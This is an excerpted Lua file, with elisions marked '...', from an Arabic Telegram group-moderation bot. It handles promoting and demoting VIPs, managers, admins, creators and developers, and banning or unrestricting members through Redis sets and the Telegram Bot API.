DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, setvip, 1, 'md') 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'vip:groups',result.sender_user_id_) then
if data.username_ == false then
...
MARX:sadd(DEVSTOR..'vip:groups',result.sender_user_id_)  
else
...
return false  end
if result.id_ then  
if not MARX:sismember(DEVSTOR..'vip:groups',result.id_) then
setvips = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تـم تـرقيتـه مميز عام البوت'   
MARX:sadd(DEVSTOR..'vip:groups',result.id_)  
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
setvips = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو مميز عام'   
MARX:sadd(DEVSTOR..'vip:groups',result.id_)  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'vip:groups',result.sender_user_id_) then
if data.username_ == false then
setvips = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من مميزين عام\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, setvips, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'vip:groups',result.sender_user_id_)  
else
setvips = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` *❫*\n*🚸¦* تم تنزيله من مميزين عام'   
MARX:srem(DEVSTOR..'vip:groups',result.sender_user_id_)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, setvips, 1, 'md') 
...
return false  end
if result.id_ then  
if MARX:sismember(DEVSTOR..'vip:groups',result.id_) then
setvips = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تم تنزيله من مميزين عام'   
MARX:srem(DEVSTOR..'vip:groups',result.id_)  
else
setvips = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو ليس مميز عام'   
MARX:srem(DEVSTOR..'vip:groups',result.id_)  
end
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'vip:groups',user) then
if data.username_ == false then
setvips = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من مميزين عام\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, setvips, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'vip:groups',user)  
else
setvips = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تم تنزيله من مميزين عام'   
MARX:srem(DEVSTOR..'vip:groups',user)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, setvips, 1, 'md') 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم تـرقيتـه مدير للـكروب\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'modergroup'..msg.chat_id_,result.sender_user_id_)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` *❫*\n*🚸¦* تـم تـرقيتـه مدير للـكروب'   
MARX:sadd(DEVSTOR..'modergroup'..msg.chat_id_,result.sender_user_id_)  
seavusername(result.sender_user_id_) 
...
return false  end
if result.id_ then  
if not MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تـم تـرقيتـه مدير للـكروب'   
MARX:sadd(DEVSTOR..'modergroup'..msg.chat_id_,result.id_)  
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو مدير'   
MARX:sadd(DEVSTOR..'modergroup'..msg.chat_id_,result.id_)  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم تـرقيتـه مدير للـكروب\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'modergroup'..msg.chat_id_,user)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تـم تـرقيتـه مدير للـكروب'   
MARX:sadd(DEVSTOR..'modergroup'..msg.chat_id_,user)  
seavusername(user) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من المدراء\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'modergroup'..msg.chat_id_,result.sender_user_id_)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` *❫*\n*🚸¦* تم تنزيله من المدراء'   
MARX:srem(DEVSTOR..'modergroup'..msg.chat_id_,result.sender_user_id_)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
...
return false  end
if result.id_ then  
if MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تم تنزيله من المدراء'   
MARX:srem(DEVSTOR..'modergroup'..msg.chat_id_,result.id_)  
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو ليس مدير'   
MARX:srem(DEVSTOR..'modergroup'..msg.chat_id_,result.id_)  
end
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'modergroup'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من المدراء\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'modergroup'..msg.chat_id_,user)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تم تنزيله من المدراء'   
MARX:srem(DEVSTOR..'modergroup'..msg.chat_id_,user)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم تـرقيتـه ادمن للـكروب\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'mods:'..msg.chat_id_,result.sender_user_id_)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` *❫*\n*🚸¦* تـم تـرقيتـه ادمن للـكروب'   
MARX:sadd(DEVSTOR..'mods:'..msg.chat_id_,result.sender_user_id_)  
seavusername(result.sender_user_id_) 
...
return false  end
if result.id_ then  
if not MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تـم تـرقيتـه ادمن للـكروب'   
MARX:sadd(DEVSTOR..'mods:'..msg.chat_id_,result.id_)  
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو ادمن'   
MARX:sadd(DEVSTOR..'mods:'..msg.chat_id_,result.id_)  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم تـرقيتـه ادمن للـكروب\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'mods:'..msg.chat_id_,user)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تـم تـرقيتـه ادمن للـكروب'   
MARX:sadd(DEVSTOR..'mods:'..msg.chat_id_,user)  
seavusername(user) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من الادمنيه\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'mods:'..msg.chat_id_,result.sender_user_id_)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` *❫*\n*🚸¦* تم تنزيله من الادمنيه'   
MARX:srem(DEVSTOR..'mods:'..msg.chat_id_,result.sender_user_id_)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
...
return false  end
if result.id_ then  
if MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تم تنزيله من الادمنيه'   
MARX:srem(DEVSTOR..'mods:'..msg.chat_id_,result.id_)  
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو ليس ادمن'   
MARX:srem(DEVSTOR..'mods:'..msg.chat_id_,result.id_)  
end
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'mods:'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من الادمنيه\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'mods:'..msg.chat_id_,user)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تم تنزيله من الادمنيه'   
MARX:srem(DEVSTOR..'mods:'..msg.chat_id_,user)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
...
MARX:sadd(DEVSTOR..'moder'..msg.chat_id_,result.sender_user_id_)  
else
...
return false  end
if result.id_ then  
if not MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,result.id_) then
setmonsh = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تـم تـرقيتـه منشئ للـكروب'   
MARX:sadd(DEVSTOR..'moder'..msg.chat_id_,result.id_)  
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
setmonsh = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو منشئ'   
MARX:sadd(DEVSTOR..'moder'..msg.chat_id_,result.id_)  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,user) then
if data.username_ == false then
setmonsh = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم تـرقيتـه منشئ للـكروب\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, setmonsh, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'moder'..msg.chat_id_,user)  
else
setmonsh = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تـم تـرقيتـه منشئ للـكروب'   
MARX:sadd(DEVSTOR..'moder'..msg.chat_id_,user)  
seavusername(user) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
setmonsh = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من المنشئين\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, setmonsh, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'moder'..msg.chat_id_,result.sender_user_id_)  
else
setmonsh = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` *❫*\n*🚸¦* تم تنزيله من المنشئين'   
MARX:srem(DEVSTOR..'moder'..msg.chat_id_,result.sender_user_id_)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, setmonsh, 1, 'md') 
...
return false  end
if result.id_ then  
if MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,result.id_) then
setmonsh = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تم تنزيله من المنشئين'   
MARX:srem(DEVSTOR..'moder'..msg.chat_id_,result.id_)  
else
setmonsh = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو ليس منشئ'   
MARX:srem(DEVSTOR..'moder'..msg.chat_id_,result.id_)  
end
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'moder'..msg.chat_id_,user) then
if data.username_ == false then
setmonsh = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من المنشئين\n'   
DEVILmonshn(msg.chat_id_, user, msg.id_, setmonsh, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'moder'..msg.chat_id_,user)  
else
setmonsh = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تم تنزيله من المنشئين'   
MARX:srem(DEVSTOR..'moder'..msg.chat_id_,user)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, setmonsh, 1, 'md') 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'sudo:bot',result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم تـرقيتـه مطور البوت\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'sudo:bot',result.sender_user_id_)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` *❫*\n*🚸¦* تـم تـرقيتـه مطور البوت'   
MARX:sadd(DEVSTOR..'sudo:bot',result.sender_user_id_)  
seavusername(result.sender_user_id_) 
...
return false  end
if result.id_ then  
if not MARX:sismember(DEVSTOR..'sudo:bot',result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تـم تـرقيتـه مطور البوت'   
MARX:sadd(DEVSTOR..'sudo:bot',result.id_)  
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو مطور'   
MARX:sadd(DEVSTOR..'sudo:bot',result.id_)  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'sudo:bot',user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم تـرقيتـه مطور البوت\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'sudo:bot',user)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تـم تـرقيتـه مطور البوت'   
MARX:sadd(DEVSTOR..'sudo:bot',user)  
seavusername(user) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'sudo:bot',result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من المطورين\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'sudo:bot',result.sender_user_id_)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` *❫*\n*🚸¦* تم تنزيله من المطورين'   
MARX:srem(DEVSTOR..'sudo:bot',result.sender_user_id_)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
...
return false  end
if result.id_ then  
if MARX:sismember(DEVSTOR..'sudo:bot',result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* تم تنزيله من المطورين'   
MARX:srem(DEVSTOR..'sudo:bot',result.id_)  
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` *❫*\n*🚸¦* بالتاكيد هو ليس مطور'   
MARX:srem(DEVSTOR..'sudo:bot',result.id_)  
end
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا تستطيع رفع وتنزيل البوتات *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'sudo:bot',user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم تنزيله من المطورين\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'sudo:bot',user)  
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` *❫*\n*🚸¦* تم تنزيله من المطورين'   
MARX:srem(DEVSTOR..'sudo:bot',user)  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
...
if MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,result.sender_user_id_) or MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_) or MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء رفع قيوده\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
...
MARX:srem(DEVSTOR..'tedmembars'..msg.chat_id_,result.sender_user_id_) 
MARX:srem(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.sender_user_id_)   
MARX:srem(DEVSTOR..'mutes'..msg.chat_id_,result.sender_user_id_)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` ❫\n*🚸¦* تم الغاء رفع قيوده\n🍃'   
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
MARX:srem(DEVSTOR..'tedmembars'..msg.chat_id_,result.sender_user_id_) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا استطيع استخراج معلوماته*\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,user) or MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,user) or MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء رفع قيوده\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
...
MARX:srem(DEVSTOR..'tedmembars'..msg.chat_id_,user) 
MARX:srem(DEVSTOR..'DEVIL:baned'..msg.chat_id_,user)   
MARX:srem(DEVSTOR..'mutes'..msg.chat_id_,user)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` ❫\n*🚸¦* تم الغاء رفع قيوده\n🍃'   
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
MARX:srem(DEVSTOR..'tedmembars'..msg.chat_id_,user) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا استطيع استخراج معلوماته*\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'tedmembars'..msg.chat_id_,result.id_) or MARX:sismember(DEVSTOR..'mutes'..msg.chat_id_,result.id_) or MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تم الغاء رفع قيوده\n🍃'   
...
MARX:srem(DEVSTOR..'tedmembars'..msg.chat_id_,result.id_) 
MARX:srem(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.id_)   
MARX:srem(DEVSTOR..'mutes'..msg.chat_id_,result.id_)   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') 
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* بالتاكيد تم الغاء رفع قيوده\n🍃'   
HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ انا لست ادمن في المجموعه *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم حظره من الكروب\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))   
MARX:sadd(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.sender_user_id_)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..result.sender_user_id_..'` ❫\n*🚸¦* تـم حظره من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.sender_user_id_)   
seavusername(result.sender_user_id_) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ انا لست ادمن في المجموعه *\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.id_) then
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* تـم حظره من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.id_)   
MARX:set(DEVSTOR.."user:Name"..result.id_,"@"..username)
else
zo = '*📮¦* العضــو » ❪ [@'..username..'] ❫\n*📬¦ الايـدي » ❪* `'..result.id_..'` ❫\n*🚸¦* بالتاكيد تـم حظره من الكروب\n🍃'     
MARX:sadd(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.id_)   
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ لا استطيع استخراج معلوماته*\n💥', 1, 'md') 
return false  end
if not MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,user) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تـم حظره من الكروب\n🍃'   
DEVILmonshn(msg.chat_id_, user, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:sadd(DEVSTOR..'DEVIL:baned'..msg.chat_id_,user)   
else
zo = '*📮¦* العضــو » ❪ [@'..data.username_..'] ❫\n*📬¦ الايـدي » ❪* `'..user..'` ❫\n*🚸¦* تـم حظره من الكروب\n🍃'   
MARX:sadd(DEVSTOR..'DEVIL:baned'..msg.chat_id_,user)   
seavusername(user) 
...
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📮¦ انا لست ادمن في المجموعه *\n💥', 1, 'md') 
return false  end
if MARX:sismember(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then
zo = '📮¦ العضــو » ❪ '..CatchName(data.first_name_,15)..' ❫\n📬¦ تم الغاء حظره\n🍃'   
DEVILmonshn(msg.chat_id_, result.sender_user_id_, msg.id_, zo, 16, utf8.len(CatchName(data.first_name_,15)))  
MARX:srem(DEVSTOR..'DEVIL:baned'..msg.chat_id_,result.sender_user_id_)   
...
